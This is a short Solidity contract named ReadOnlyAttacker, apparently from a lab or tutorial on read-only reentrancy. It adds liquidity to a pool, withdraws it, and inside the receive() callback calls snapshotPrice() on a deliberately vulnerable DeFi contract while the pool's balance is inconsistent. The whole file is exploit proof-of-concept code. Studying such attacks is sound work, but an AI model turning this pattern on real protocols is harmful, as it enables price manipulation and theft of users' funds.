//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../ReadOnly.sol";
import "hardhat/console.sol";

contract ReadOnlyAttacker {
    ReadOnlyPool public target;
    VulnerableDeFiContract public vulDefi;

    constructor(ReadOnlyPool _target, VulnerableDeFiContract _vulDefi) {
        target = _target;
        vulDefi = _vulDefi;
    }

    function attack() public payable {
        target.addLiquidity{value: msg.value}();
        target.removeLiquidity();
    }

    receive() external payable {
        // We will do something here before tokens are burnt
        // at this point is the ether in this contract now?
        console.log("ReadOnlyPool Balance:", address(target).balance);
        vulDefi.snapshotPrice();
    }
}
